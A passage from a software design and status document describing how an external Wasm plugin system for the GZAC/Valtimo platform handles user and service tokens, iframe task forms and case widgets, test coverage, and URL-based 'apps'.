Extism per-call `hostContext` (host-only, **never** serialised into the Wasm input), and the
`gzac_api` host function uses it when the request carries `as:"user"` (401-shaped reply if absent),
else the service token. The `/data` route **requires** the token and validates it before any Wasm
runs: the host introspects it against the configuration's GZAC (§13.5) and rejects tokens GZAC
refuses (401) or that are bound to another configuration (403). GZAC additionally verifies the
token server-side on every `as:"user"` callback — the introspection gates Wasm execution, while
each individual callback stays independently authenticated, so a forged token gets no execution
and would only yield 401s from GZAC anyway. ⚠️ This hands the user token to the **plugin host** —
a deliberate relaxation of "the token never leaves the browser," bounded by PBAC ∩ allowlist + the
short TTL; plugin code receives data, never the token.

### 13.5 Four communication levels (sample plugin) ✅

The `case-summary` case tab demonstrates, side by side:

1. **tab → GZAC (user token)** — `sdk.callValtimo` via the parent-proxy; PBAC ∩ allowlist.
2. **tab → plugin backend (static)** — `sdk.getPluginData("/summary")` → `handle_request`, no GZAC.
3. **tab → plugin backend → GZAC (user token)** — `gzacApi.asUser`; row-level PBAC ∩ allowlist.
4. **tab → plugin backend → GZAC (service token)** — `gzacApi`; PBAC-bypassed, allowlist-only —
   scope broader than the user.

Levels 3 & 4 count cases via `POST /api/v1/case/{key}/search` (`totalElements`), a **row-level
PBAC-filtered** list, so the user token returns the user's visible subset and the service token the
full set — a faithful scope comparison. (A single-document GET can't show this: it's all-or-nothing
and the user already has access to the case whose tab they opened — hence the count.)
The sample manifest's `permissions.endpoints` therefore includes
`{ "method": "POST", "pattern": "/api/v1/case/*/search" }`; the configuration must be granted it
for the allowlist to permit either token.

Service tokens (action/event callbacks) work identically on every path. The host `/data` route is
browser-facing (no HMAC — the caller is a browser, not GZAC), so executing plugin Wasm through it
is gated on a chain: the request must name a `configurationId` whose pushed configuration exists,
targets the addressed plugin version, and **was granted the `frontend_data` capability** by an
admin — otherwise 403 and the Wasm never runs; a per-configuration rate limit
(`DATA_RATE_LIMIT_PER_MINUTE`) bounds abuse; and the request must carry the downscoped
`userToken`, which the host **introspects against GZAC** (`GET
/api/v1/external-plugin/user-token/introspect` — the token authenticates itself; the endpoint
echoes `{subject, configurationId, expiresAt}`) and requires to be bound to the very
configuration the request names (§7). The route is therefore public in transport terms only —
executing Wasm always requires proof of an authenticated GZAC user of that configuration; GZAC
being unreachable fails closed with a 503. A plugin that wants to serve iframe data declares
`frontend_data` in `manifest.permissions.capabilities` (§18.1). Plugins must still treat
`handle_request` input as untrusted and never return data they would not expose to every user of
the configuration's GZAC instance — the token proves *who is asking*, not that any field is
truthful — and level-3/4 access to *GZAC* data stays bounded by the user token's PBAC ∩ allowlist
and the service token's allowlist respectively.

### 13.6 Task-form surface (`external_plugin_task_form` process-link type) ✅

A plugin renders the form for a **user task**, and **GZAC completes the task the same way it completes
every other form** (form.io / URL process links): the form's data is submitted to a GZAC endpoint,
GZAC resolves the values and completes the task server-side through `ProcessDocumentService`. The
plugin is an *optional participant* in the submission, not the driver of completion.

Three capability levels are supported (see the `case-summary` sample below):

- **Level 0 — pure form, zero backend code.** The bundle collects input and calls `sdk.submitTask(data)`
  with value-resolver-prefixed keys (`pv:approved` → process variable, `doc:/reviewComment` → case
  document field; unprefixed keys default to process variables). GZAC resolves them and completes the
  task. No `request()` handler, no `permissions.endpoints`, no user token.
- **Level 1 — transform / validate hook.** The `task-form` bundle declares `submitHandler: true`. During
  submission GZAC first calls the plugin's `handle_submit` export (server-to-server, HMAC, service
  token — the same rails as actions) with `{ configurationId, taskId, processInstanceId, documentId,
  submission }`. The hook returns `{ status:"completed", variables, documentContent }` (GZAC completes
  the task with those values) or `{ status:"error", errorMessage, fieldErrors }` (GZAC does **not**
  complete; the errors are surfaced on the form). Covers custom validation, derived variables,
  enrichment, and rejecting bad input with per-field messages.
- **Level 2 — full custom (escape hatch, retained).** The bundle drives completion itself via
  `sdk.postPluginData("/submit-task")` → `handle_request` → `gzacApi.asUser.post('/api/v1/task/{id}/complete')`
  (level 3, §13.5), then emits `taskCompleted`. Needs the task-complete grant. Not the default —
  kept for genuinely custom needs.

**Why this shape.** The earlier design made the *plugin* drive completion: every task-form plugin
needed a hand-written `/submit-task` handler, a `POST /api/v1/task/*/complete` grant, and the
downscoped-token machinery — and it went through the plain task-complete endpoint, bypassing the
value-resolver / document-update pipeline, so it was strictly *less* capable than a form.io task. The
new model makes GZAC the driver, so a plugin form gets the full pipeline (value resolvers, `doc:`
document updates, submission storage, the `TaskCompleted` outbox event, PBAC) for free, with the hook
as a principled place for custom backend logic and Level 2 as the escape hatch.

Structure:

- **Process-link type** `external_plugin_task_form` is a distinct `ProcessLink` subtype, kept separate
  from the `external_plugin` service-task action type because the surfaces are unrelated (a form to
  render vs. a backend action to invoke). Entity `ExternalPluginTaskFormProcessLink` maps
  `external_plugin_task_form_{config_id,bundle_key}` on the shared `process_link` table (DDL in
  the release changelogs `13-32-0/20260706-add-external-plugin-task-form-process-link.xml` +
  `13-32-0/20260720-plugin-configuration-reference-external-plugin-version.xml`, not in
  `initial-setup`); the plugin identity/version rides on the shared reference columns like the
  action link's (§5). It ships the five `ProcessLinkMapper` DTOs and a `SupportedProcessLinkTypeHandler`
  that declares **`USER_TASK_CREATE`** (the action type declares `SERVICE_TASK_START`).
- **Render descriptor, no dedicated open controller.** A `ProcessLinkActivityHandler` (shaped like the
  URL/UI-component handlers — a render descriptor, not an execution listener) answers the generic
  `GET /api/v2/process-link/task/{taskId}` with an `external-plugin-task-form`
  `ProcessLinkActivityResult` carrying `{ bundleUrl, configurationId, bundleKey, context }` (plus the
  result's own `processLinkId`), where `context = { taskId, processInstanceId, documentId,
  pluginConfigurationId }`. `taskId` is authoritative — supplied by the backend, never read from the
  browser's request body.
- **Submission — a vertical slice mirroring form.io.** `ExternalPluginTaskFormSubmissionResource`
  exposes `POST /api/v1/process-link/{processLinkId}/external-plugin-task-form/submission
  ?documentId=&taskInstanceId=` (`.authenticated()` in `ExternalPluginHttpSecurityConfigurer`).
  `ExternalPluginTaskFormSubmissionService` **requires a non-null `taskInstanceId` up front** —
  without a task there is nothing to complete and, crucially, no task to check the COMPLETE
  permission on, so no hook may run either — then loads the link, asserts the caller's COMPLETE permission,
  optionally runs the Level 1 hook (via `ExternalPluginHostClient.invokeSubmit` → host
  `POST /plugins/:id/:version/submit/:key` → `pluginManager.callSubmit` → Wasm `handle_submit`),
  categorizes the effective submission by value-resolver prefix (`pv:` → process vars, everything else
  with a `:` prefix → value-resolver values applied to the document, unprefixed → process vars), and
  dispatches a `ModifyDocumentAndCompleteTaskRequest` through `ProcessDocumentService` — the identical
  path `form`/`url` use. With no case document it falls back to `OperatonTaskService
  .completeTaskWithFormData(taskId, processVars)`. A Level 1 hook rejection returns an
  `ExternalPluginTaskFormSubmissionResult { errors, fieldErrors, documentId }` with HTTP 400 and never
  completes the task.
- **Bundle URL resolution.** `ExternalPluginBundleUrlResolver.resolve(configurationId, bundleType,
  bundleKey)` resolves `${definition.baseUrl}/${definition.version}${bundle.path}` for the manifest's
  `task-form` bundle; the case-tab (§13.1) and task-form surfaces share it.
- **Delete guard.** `ExternalPluginHostUsageResolver` unions task-form links with action links, so a
  configuration referenced by a task form blocks deletion of its plugin/host (§12).
- **Admin UX** (`@valtimo/process-link`). There is no separate tile: an external plugin's task-form is
  configured inside the **"Plugin"** flow. On a user task the plugin's `task-form` bundles are listed as
  the selectable options in the "choose action" step (in place of service-task actions), the "configure"
  step has nothing to fill in, and saving writes the `external_plugin_task_form` link. This works
  because external plugin **actions are activity-type filtered**: `SelectPluginActionComponent` offers an
  action only for the activity types its manifest declares (`SERVICE_TASK_START`, …), so a user task
  surfaces the plugin's forms rather than its actions (and an action can never be linked to an activity
  where it could not run). The process-link framework resolves the link type by Jackson **deduction**
  (which fields are present, not `processLinkType`), so the create/update DTO always serialises
  `bundleKey` (null for a plugin's sole, unkeyed bundle) to stay distinguishable from the action link,
  which is identified by its `actionKey`. The BPMN properties-panel "Process link" preview shows the
  bundle key with a purple **Plugin** tag; the stepper labels external actions/forms by their manifest
  title rather than a translation-bundle lookup (external plugins have no embedded translation bundle).
- **Iframe sandbox.** The plugin iframe is sandboxed `allow-scripts allow-forms` (still without
  `allow-same-origin`, §13.2). `allow-forms` lets a task-form submit through an idiomatic `<form>`: the
  bundle's submit handler forwards the data by postMessage, but without `allow-forms` the browser blocks
  the submit before that handler runs. It grants nothing a script cannot already do (a script can POST
  via `fetch`) and preserves the opaque origin.
- **Runtime** (`@valtimo/task`). `TaskDetailContentComponent` maps the `external-plugin-task-form`
  result to `TaskExternalPluginFormComponent` (passing `processLinkId`), which embeds
  `<valtimo-external-plugin-iframe>`. For Level 0/1 the bundle calls `sdk.submitTask(data)`; the iframe
  emits a `submitTask` postMessage, surfaced as `submitTaskEvent`, and the component POSTs the data to
  the submission endpoint via `ExternalPluginTaskFormSubmissionService` (the Angular parent submits,
  under the logged-in user's Keycloak session — **no downscoped token needed for submission**, and the
  authoritative `taskInstanceId`/`documentId` come from the process-link result, not the iframe). On
  success it emits `completedEvent` (parent closes the task + refreshes) and replies `submitResult{ok:true}`;
  a validation failure replies `submitResult{ok:false, errors, fieldErrors}` so the form renders inline
  errors without being torn down. Level 2 keeps its own `taskCompleted` → `taskCompletedEvent` path.
  The downscoped user token is minted **best-effort** through the shared
  `ExternalPluginSessionService` (§13.3 — only Level 2 and live in-form GZAC reads need it), so a
  pure Level 0/1 form still renders and submits if the mint fails.
- **SDK.** `task-form` is a `FrontendBundle.type` (checked by the shared manifest validator), and the
  bundle may set `submitHandler: true` (Level 1). The backend SDK adds `submit(key, handler)` plus the
  `handle_submit` Wasm export (wired automatically by the build tool alongside `handle_action`/
  `_event`/`_request`) and the `SubmitInput`/`SubmitOutput` types. The frontend SDK adds
  `sdk.submitTask(data): Promise<{ ok, errors?, fieldErrors? }>` (the `submitTask`/`submitResult`
  postMessage pair); `postPluginData` + `taskCompleted` remain for Level 2.
- **Sample** (`case-summary`). Ships three `task-form` bundles demonstrating the levels side by side:
  `approve` (Level 0 — sends `pv:`/`doc:` prefixed fields, no backend code), `review` (Level 1 —
  `submitHandler: true` + a `submit("review", …)` hook that rejects a rejection with no comment via
  `fieldErrors` and otherwise derives variables + a document field), and `custom` (Level 2 — the
  `/submit-task` `request()` handler completing via `gzacApi.asUser`, with `permissions.endpoints`
  granting `{ "method": "POST", "pattern": "/api/v1/task/*/complete" }`, the only bundle that needs it).

### 13.7 Case-widget surface (`external-plugin` case-widget subtype) ✅

Unlike the case *tab* (§13.1, a whole tab rendered as one iframe), a case *widget* is a **card inside
a `WIDGETS` tab's grid**, alongside the first-party widgets (fields, table, map, …). It is a new
**widget subtype** in the existing case-widget system — not a new tab type — rendered as the same
sandboxed `<valtimo-external-plugin-iframe>` and reusing the identical security model (parent-proxy,
downscoped user token, opaque origin) as the case tab. The bundle uses the same SDK surface:
`sdk.callValtimo`, `sdk.getPluginData`, `sdk.t`. No SDK / pack tool / host changes were needed
(`case-widget` was already a member of `FRONTEND_BUNDLE_TYPES` and the generic
`ExternalPluginBundleUrlResolver` already resolves it).

Structure:

- **Widget subtype.** `ExternalPluginCaseWidget` (`@DiscriminatorValue("external-plugin")`) extends
  `CaseWidgetTabWidget` on the single-table-inheritance `case_widget_tab_widget` table. Unlike the
  `custom` widget (a JSON `properties` column) the config maps to **dedicated, queryable columns**
  (`external_plugin_configuration_id`, `bundle_key`, `plugin_definition_key`,
  `plugin_definition_version`; changelog `13-32-0/20260731-add-external-plugin-case-widget.xml`) so the
  delete guard and dangling-repair panel can find widgets by configuration id portably across the
  Postgres/MySQL dual database support. The DTO nests these under `properties` (frontend-consistent,
  like `custom`); `ExternalPluginCaseWidgetMapper` bridges the two.
- **Render descriptor.** Rendering + data reuse the existing widget endpoints — no new REST endpoint.
  `GET .../widget-tab/{tabKey}` returns the widget DTO; `GET .../widget-tab/{tabKey}/widget/{widgetKey}`
  runs the matching `CaseWidgetDataProvider`. `ExternalPluginCaseWidgetDataProvider` returns an
  `ExternalPluginWidgetContentDto { bundleUrl, configurationId, bundleKey, context }` (context =
  `{ documentId, caseDefinitionKey, caseDefinitionVersionTag, pluginConfigurationId }`). Resolving the
  bundle URL lives in the data provider (not the mapper's `toDto`) because only it has the `documentId`
  to build the context, and it reuses the endpoint's per-widget PBAC check (`CaseWidgetTabWidget` VIEW
  with document context). `bundleUrl` is `null` when the resolver is absent or the configuration is
  dangling — the frontend then shows an unavailable state, matching the tab.
- **Resolver SPI.** `ExternalPluginCaseWidgetResolver` (declared in `case`, implemented in
  `external-plugin` as `ExternalPluginCaseWidgetResolverImpl`) delegates to the shared
  `ExternalPluginBundleUrlResolver.resolve(configId, "case-widget", bundleKey)` and reuses the
  `ExternalPluginTabDefinition` data shape — the widget sibling of `ExternalPluginCaseTabResolver`
  (Optional, so `case` runs without external-plugin on the classpath).
- **Admin UX** (`@valtimo/layout` + `@valtimo/case-management`). A new `external-plugin` entry in the
  widget wizard's `AVAILABLE_WIDGETS`, with a CONTENT-step editor (`WidgetManagementExternalPluginComponent`)
  that offers two combo boxes — configuration, then `case-widget` bundle (auto-selected when the plugin
  ships exactly one) — and writes `properties: { configurationId, bundleKey }`. Layout reads its config
  options from an injected `EXTERNAL_PLUGIN_WIDGET_CONFIG_TOKEN` (like `CUSTOM_WIDGET_TOKEN`), so
  `@valtimo/layout` keeps **no dependency on `@valtimo/plugin`**; case-management provides the token
  (reusing the `getExternalPluginConfigs` pattern filtered to `case-widget`). The type appears in the
  "add widget" picker only when at least one activated configuration exposes a `case-widget` bundle. The
  generic WIDTH / DENSITY / APPEARANCE / DISPLAY_CONDITIONS wizard steps apply for full parity.
- **Runtime** (`@valtimo/case`). The case `widgetComponentMap` maps `external-plugin` →
  `CaseWidgetExternalPluginComponent` (merged over the layout default; no layout registry change). It
  provides a page-scoped `ExternalPluginSessionService`, fetches the descriptor via the widget-data
  endpoint, mints the downscoped user token, and renders `<valtimo-external-plugin-iframe>` — the same
  wiring as `CaseDetailExternalPluginTabComponent`.
- **Import / export parity + dangling repair.** See §20. The exporter stamps the plugin id/version on
  each `external-plugin` widget (self-describing export); the importer remaps `configurationId` via
  `pluginConfigurationMappings` (keeping the original, now-dangling id when a mapping is left unset,
  like the tab) and triggers an in-transaction issue recheck. A dedicated issue type
  `external-plugin-case-widget` flows through the existing dangling/mapping endpoints and repair UI
  (`source: external`). `CaseExternalPluginWidgetService` (in `case`) backs the queries/mutations,
  mirroring `CaseExternalPluginTabService`.
- **Delete guard.** `ExternalPluginHostUsageResolver` folds widget usages
  (`CaseExternalPluginWidgetService.findUsagesForConfiguration`) into `findUsagesForConfiguration`/
  `findUsagesForHost`, so a configuration referenced by any widget blocks configuration/host deletion
  (§12), surfaced in the read-only in-use modal (`PluginUsageDto` gains an optional `widgetKey`).
- **Sample** (`case-summary`). Ships **two** `case-widget` bundles — `summary-widget`
  (`frontend/case-widget.tsx`, a compact card using `sdk.getPluginData` + `sdk.callValtimo` + `sdk.t`)
  and `metrics-widget` (`frontend/case-widget-metrics.tsx`, a tiles card) — so the admin editor's second
  combo box (the bundle picker) is exercised when a configuration exposes more than one bundle.

## 14. Not yet implemented ⛔

- HTMX `render_page` (only the RPC-style `handle_request` for JSON data is implemented).
- DLQ for nacked or expired messages (today `nack(false,false)` drops, `x-expires` deletes the
  queue and its contents).
- Publisher **package signing** — content pinning (§11) is hash-based trust-on-first-use, tied to
  whoever can reach the upload endpoint, not to a verified publisher identity.
- Admin-UI surface for token revocation — API-complete (`revoke-tokens`; the configuration DTO
  exposes `tokenGeneration`) but has no dedicated screen. (Content re-acceptance, by contrast, is
  **API-only by design** — §11.)

All iframe surfaces are now implemented: case **tab** (§13.1), **task form** (§13.6),
**menu pages** (§13) and case **widgets** (§13.7).

## 15. Roadmap (priority order)

1. Remaining iframe surfaces: HTMX pages (case **tab** §13.1, **task form** §13.6,
   **menu pages** §13 and case **widgets** §13.7 done).
2. Cleanup: align async-vs-sync SDK docs.

## 16. Verification status

- Host `tsc` build and `@valtimo/plugin-sdk` build: clean (including the optional-TLS
  `buildHttpsOptions` wiring in `plugin-host/app/src/index.ts`).
- Backend `:backend:external-plugin:test`: BUILD SUCCESSFUL (allowlist **for both the service and the
  user principal** + service-token-filter + service-token-ttl + **user-token suites** +
  **task-form-submission suite** + endpoint-
  description-coverage + host-client-HMAC + host-registration transport-guard + compatibility +
  event-queue mode/TTL tests). The endpoint-description-coverage suite
  (`EndpointDescriptionCoverageTest`, §3.8/§4) scans every controller on the test classpath and fails
  unless each handler carries an `@EndpointDescription` with both `en` and `nl` text — so the
  user-token (`ExternalPluginUserTokenResource`), case-tab (`CaseExternalPluginTabResource`) and
  task-form-submission (`ExternalPluginTaskFormSubmissionResource`) endpoints declare descriptions like
  every other endpoint (and the scan additionally required — and now carries — descriptions on
  `ObjectManagementConsumerResource` and `PbacRegistryResource`, which the wider test classpath pulls
  in). The task-form-submission suite (`processlink/ExternalPluginTaskFormSubmissionServiceTest`)
  asserts a Level 1 hook rejection surfaces `fieldErrors` and **never** completes the task
  (`ProcessDocumentService.dispatch` and `completeTaskWithFormData` un-called), and that a Level 0
  submission with no hook categorizes prefixed/unprefixed values and completes via
  `completeTaskWithFormData`. The user-token suites assert: the minted JWT's claims
  (`sub`/`roles`/`plugin_config_id`/`type`) and that the TTL defaults to and is capped at 15 min
  (`ExternalPluginUserTokenServiceTest`); the filter authenticates a valid token, rebuilds the user's
  authorities from the `roles` claim, strips the `Authorization` header, and — critically — leaves
  `AuthorizationContext.ignoreAuthorization` **false** so PBAC stays active (`ExternalPluginUserTokenFilterTest`);
  and `ExternalPluginEndpointAllowlistFilterTest` permits a granted and denies an ungranted
  `(method, path)` for an `ExternalPluginUserPrincipal`, and pins the introspection carve-out
  (a user token reaches `GET …/user-token/introspect` despite the denylist and without grants; a
  service token does not; other `/api/v1/external-plugin/**` paths stay denied). The
  introspection resource suite (`ExternalPluginUserTokenIntrospectionResourceTest`) asserts a
  user-token principal receives the token's `{subject, configurationId, expiresAt}` and every
  other principal is rejected with 403. The bundle-resolver SPI
  (`ExternalPluginCaseTabResolverImplTest`) asserts URL construction by bundle key / sole bundle and
  null-handling. The host-client-HMAC suite
  (`client/ExternalPluginHostClientHmacTest`) asserts `pushConfiguration` (body-bound, **including
  the `queueMode`/`queueTtlMs` fields inside the signed `eventBroker` block, with the omit-TTL case
  for `LIVE` mode**), `deleteConfiguration` / `listPlugins` (empty-body), and `uploadPlugin`
  (file-byte-bound) each send `X-Valtimo-Signature` + `X-Valtimo-Timestamp` and **no**
  `Authorization` header, with the signature recomputed from an independent JDK HMAC oracle. The
  host-service suite (`service/ExternalPluginHostServiceTest`) asserts:
  - host registration accepts broker credentials over HTTPS and loopback HTTP, rejects them over
    plaintext HTTP to a remote host, and `isSecureTransport` classifies schemes and loopback hosts;
  - default mode is `LIVE` with null TTL; `DURABLE` without explicit TTL applies the 72h default;
    TTLs outside the 1h–30d window are rejected; `LIVE` with a non-null TTL is rejected;
  - `updateEventQueue` swaps mode + TTL on an existing host, clears the TTL when going back to
    `LIVE`, and throws when the host does not exist.

  The compatibility suite (`compatibility/GzacCompatibilityCheckerTest`,
  `compatibility/DefaultGzacVersionProviderTest`, `compatibility/PluginPackageInspectorTest`,
  `web/rest/ExternalPluginUploadCompatibilityTest`) asserts the semver range comparison
  (below-minimum, above-maximum, open bounds, and unparseable/unknown-version leniency), the
  version-provider precedence (override → Valtimo library manifest version, `null` otherwise), the
  zip manifest peek (root-entry wins, missing/blank/garbage → no gate), and the upload endpoint's
  409-unless-forced gate (an incompatible package is rejected and never forwarded to the host; a
  forced upload, a compatible package, and an undeclared package each go through). The   
  delete-guard suites cover both plugin systems: `service/ExternalPluginHostUsageResolverTest`
  (host- and configuration-scoped usage resolution, parent classification into
  CASE/BUILDING_BLOCK/GLOBAL, activity-name lookup, and graceful degradation when a process
  definition is missing/unloadable), `service/ExternalPluginConfigurationServiceDeleteTest` and
  `service/ExternalPluginHostServiceDeleteTest` (delete proceeds with no usages, throws the
  in-use exception with the populated `usages` payload otherwise), and
  `exception/ExternalPluginHostInUseExceptionTest` (pins the 409 problem-body shape: title,
  `CONFLICT` status, `hostId`, and the `PluginUsageDto` fields). The service-token suite
  (`service/ExternalPluginServiceTokenServiceTest`) asserts the issued JWT's `exp − iat` equals the
  configured TTL, falls back to 10 minutes when none is set, and stamps the configuration's
  `token_generation` claim (§3.2).
- Content-integrity and revocation suites, all green: `service/ExternalPluginDiscoveryServiceTest`
  (hash pinned on first discovery, backfilled for pre-hash definitions, change flags
  `pendingContentHash` + freezes the stored manifest + withholds pushes, rollback clears the
  flag), `service/ExternalPluginConfigurationServicePushTest` (push carries
  `expectedContentHash`, refuses while re-acceptance is pending, `revokeTokens` bumps the
  generation and re-pushes a fresh token, `applyApprovedOverwrite` pins the new hash and
  re-grants configurations to the new declared sets while skipping unknown capabilities),
  `web/rest/ExternalPluginUploadOverwriteTest` (version-exists 409 enriched with hashes and
  requested permissions; confirmed overwrite applies pin + re-grant before discovery; other host
  409s stay relayed), `service/ExternalPluginDefinitionServiceTest`
  (`acceptContent` re-pins, rejects a stale or absent pending hash),
  `security/ExternalPluginServiceTokenFilterTest` / `security/ExternalPluginUserTokenFilterTest`
  (tokens of a previous generation, without the claim, or for a deleted configuration are
  rejected), `processlink/ExternalPluginServiceTaskStartListenerTest` /
  `processlink/ExternalPluginTaskFormSubmissionServiceTest` (invocations and submissions refused
  while re-acceptance is pending), and `web/rest/ExternalPluginUserTokenResourceTest` (mint 409
  while pending; minted token bound to the current generation). Host-side (vitest):
  `plugin-manager.test.ts` (stable content hash, changes with any packaged file, `hasVersion` on
  disk and in memory), `routes/host-management.test.ts` (duplicate-version upload → 409 with both
  content hashes; explicit `overwrite=true` replaces),
  `routes/host-configurations.test.ts` (push hash mismatch → 409), `routes/plugin-bundles.test.ts`
  (strict CSP + `nosniff` + referrer policy on bundles and logo). PostgreSQL integration tests
  green — the `20260806-external-plugin-security-hardening.xml` changeset applies and matches the
  entities.
- Containment, install atomicity, memory cap and instance pool, all green (vitest):
  `plugin-sdk/src/manifest-validation.test.ts` (package identity and logo charset — the shared
  contract the pack tool and the upload route both run), `app/src/security/request-path.test.ts`
  (`gzac_api` path canonicalisation and refusals), `app/src/wasm-memory-limit.test.ts` (memory
  section patching, clamping, and round-trip validity via `WebAssembly.compile` — the patched
  module's `memory.grow` really fails past the cap), `app/src/wasm-instance-pool.test.ts`
  (parallelism, the hard ceiling under a burst, FIFO waiters, destroy-above-minimum, acquire
  timeout, drain, discard, factory failure, idle eviction), `app/src/plugin-manager.test.ts`
  (containment refusals and non-conforming directories skipped at boot; concurrent installs of one
  version resolve to exactly one 201 and one 409; overwrite drops stale files; a failed load rolls
  the swap back; instantiation from patched module bytes; pool wiring), and
  `app/src/host-functions/gzac-api.test.ts` (the traversal-bypass regression). L3
  (`app/test/wasm/plugin-manager.wasm.test.ts`): the `burn` handler proves two calls to one plugin
  overlap (~1.6 s for two 1.5 s calls) and serialise at `poolMaxInstances: 1` (~3.0 s); the
  `mem-bomb` handler proves the cap fails the call with `EXECUTION_ERROR` / "out of memory" while
  an allocation inside the cap still completes and the host serves the next call.
- Backend `:backend:plugin:test` (`service/PluginServiceTest`): BUILD SUCCESSFUL — embedded
  `deletePluginConfiguration` proceeds when no fixed process link references the configuration,
  throws `PluginConfigurationInUseException` with the `usages` payload when one does, and a
  not-found id is a no-op warning.
- Backend `:backend:app:gzac:compileKotlin`: BUILD SUCCESSFUL.
- Frontend: `@valtimo/plugin` and `@valtimo/task` `ng build` clean (typechecks the task-form submission
  service, the iframe component's `submitTask`/`submitResult` wiring, and the `TaskExternalPluginFormComponent`
  templates); full production `ng build` clean.
- Sample plugin `build:pack`: clean — the Wasm now exports `handle_submit` alongside
  `handle_action`/`_event`/`_request`, and all frontend bundles build, including the **three task-form
  bundles** (`approve` Level 0, `review` Level 1 with `submitHandler: true`, `custom` Level 2); the
  pack also includes `logo.svg`, `translations.en/nl`, `permissions.endpoints`, and `eventSubscriptions`.
- `backend/app/gzac/src/main/resources/application.yml`: the module requires no additions to it.
- Events, end-to-end against the live `gzac-rabbitmq` broker (sample plugin):
  - host startup re-opens consumers from persisted configs ("Broker consumer started" log on
    boot is expected when a previous push is in the host's PostgreSQL);
  - config push with `eventBroker` opens one broker consumer; the configuration's granted event
    types (`document.viewed`, `task.completed`, `document.created`) invoke `handle_event` →
    `completed`; unsubscribed/ungranted types are not delivered even when they appear in the
    manifest;
  - `document.created` → `gzac_api` issues `POST /api/v1/document/<id>/note` with the
    service-token bearer; the allowlist filter (§3.4) gates the call;
  - multiple hosts per instance: distinct `HOST_ID`s each handle a copy; shared `HOST_ID` is a
    competing-consumer group;
  - deleting the last configuration on a broker tears the consumer down (queue auto-deletes).
- Plugin assets, end-to-end in the browser:
  - `logo.svg` shipped with sample plugin, served at `/plugins/case-summary/0.1.0/logo`, rendered
    in the "Configure plugin" tile and the process-link picker;
  - `manifest.translations.{en,nl}` returned by `/plugin-manifest`;
  - iframe SDK fetches the manifest, applies `TranslateService.currentLang` (passed via the
    parent's `init` postMessage), renders Dutch labels when the Angular UI is Dutch and English
    labels when it is English.
- Case-tab surface (§13), end-to-end in the browser (sample `case-summary` tab on a seeded
  `EXTERNAL_PLUGIN` tab): the iframe loads at an opaque origin and renders all four communication
  levels — hello-world, plugin-served `/summary`, `tab → GZAC (user token)`, and the
  `tab → plugin backend → GZAC` user-vs-service case counts. Confirmed the content endpoint and the
  non-management user-token mint endpoint needed explicit `HttpSecurityConfigurer` matchers (a
  missing matcher 403s by deny-by-default), and that the parent-proxy `POST .../data` fetch needed
  the host origin on CSP `connect-src` (the iframe loaded via `frame-src` but the fetch was
  CSP-blocked until `connect-src` was augmented — §10). The `@valtimo/{case,case-management,plugin}`
  libs and the sample plugin `build:pack` are clean.

**Not yet verified end-to-end** (confirmed by code reading and clean builds, not by a live run):
- The host carries a vitest suite (unit tests for the HMAC hook and replay cache, the routes —
  config-push, management, actions, data, logs, bundles — the plugin manager, the config registry,
  the `gzac_api`/`http_request` host functions and `buildHttpsOptions`, plus separate Wasm and
  Postgres integration configs), so host-side HMAC verification (`createHmacAuthHook` /
  `verifyDeferredHmac`) is unit-verified. A live client↔host run
  over the config-push / management / upload routes — a successful push returning 201, a tampered body
  or stale timestamp returning 401, and a push over an HTTPS listener (the TLS handshake itself) —
  is not in the verified record.
- The **synchronous action path** (process service task → `ExternalPluginServiceTaskStartListener`
  → HMAC-signed `invokeAction` → host `preHandler` verify → Wasm `handle_action` → returned
  `variables` applied to the execution, and the 4xx→`BpmnError` path) is not verified end-to-end; the
  HMAC handshake is confirmed coherent by code reading (§3.9), but an end-to-end action run is not in
  the record.
- The **broker self-healing reconnect** (§8.3) — kill the broker container under a connected host,
  observe `"Broker connection closed; scheduling reconnect"` log lines with growing backoff, bring
  the broker back, observe `"Broker consumer reconnected"`, and confirm events published after the
  reconnect are delivered to the plugin — is confirmed by code reading and a clean `tsc`, not by a
  live broker-drop test.
- The **task-form submission round-trip** (§13.6) — `sdk.submitTask` → `submitTask` postMessage →
  `ExternalPluginTaskFormSubmissionService` POST → `ProcessDocumentService` completion for Level 0, and
  the Level 1 `handle_submit` HMAC hop (validation rejection surfacing `fieldErrors` on the form vs. a
  successful transform completing the task) — is covered by unit tests, clean lib builds, and the
  sample `build:pack`, but a live browser run of all three levels against a running task is not yet in
  the verified record. Level 2 reuses the previously code-verified `handle_request`/`gzacApi.asUser`
  path.
- The **building-block, import-parity, and result-write-back features** (§19–§21) are verified by
  unit suites (`:backend:{plugin,plugin-valtimo,external-plugin,building-block,process-link,case}:test`),
  `:backend:external-plugin:integrationTestingPostgresql` / `:backend:plugin:integrationTesting{Postgresql,Mysql}`
  (which run every Liquibase changelog against real databases), clean `ng build` of
  `@valtimo/{process-link,case-management,plugin,shared}`, SDK/host `tsc`, and the sample
  `build:pack` — but not by a live run. Outstanding live checks: a BB call activity resolving an
  external action through the namespaced mapping and invoking the host; a result mapping writing to
  a real case/BB document (`doc:`/`pv:`); the import wizard round-trip in the browser (external rows
  mapped, external case tab surviving import with its side row); and the dangling-import → issue
  banner → repair flow.

## 17. Apps — URL plugins ✅

An **app** is a remote HTTP service, added by URL, that **is a plugin-host-plus-single-plugin**: it
speaks the exact same GZAC↔host contract (discovery, HMAC-signed pushes/actions, public
iframe/data routes) but serves one natively-implemented plugin and accepts no uploads. Terminology:
an **integration** is the umbrella for a **plugin host** or an **app**.

The whole feature is a thin discriminator over the existing machinery — no new tables, no new
endpoints, no duplicated token/HMAC/discovery/iframe code:

- **`external_plugin_host.kind`** (`ExternalPluginHostKind = PLUGIN_HOST | APP`, default
  `PLUGIN_HOST`, `20260708-external-plugin-host-kind.xml`). Carried through `HostCreateRequest` /
  `HostResponse` and `ExternalPluginHostService.register()`.
- **Immediate discovery on registration** — `createHost()` calls the new
  `ExternalPluginDiscoveryService.discoverHost(hostId)` for an APP so its single plugin is
  discovered and configurable at once instead of on the next ≤60 s poll. Best-effort; the periodic
  cycle reconciles regardless.
- **Upload guard** — `ExternalPluginHostService.uploadPlugin()` rejects an APP host (an app serves
  its own plugin); the UI hides upload for apps and restricts the upload host list to
  `kind = PLUGIN_HOST`.
- **Admin UX** — the "Plugin hosts" tab becomes **Integrations** with a **Type** tag column; an
  **Add app** button opens the shared host modal in APP mode. Discovery, configuration, permissions,
  process-link/case-tab/task-form binding, and deletion guards are all reused unchanged, because an
  app's single plugin surfaces as an ordinary `external_plugin_definition`.

Everything downstream of registration is identical to a plugin host, so an app gets service tokens,
the endpoint allowlist, user tokens, iframe surfaces, and event delivery for free.

**Reference app.** `plugin-host/sample-apps/demo-app/` is a standalone Node + Fastify service that
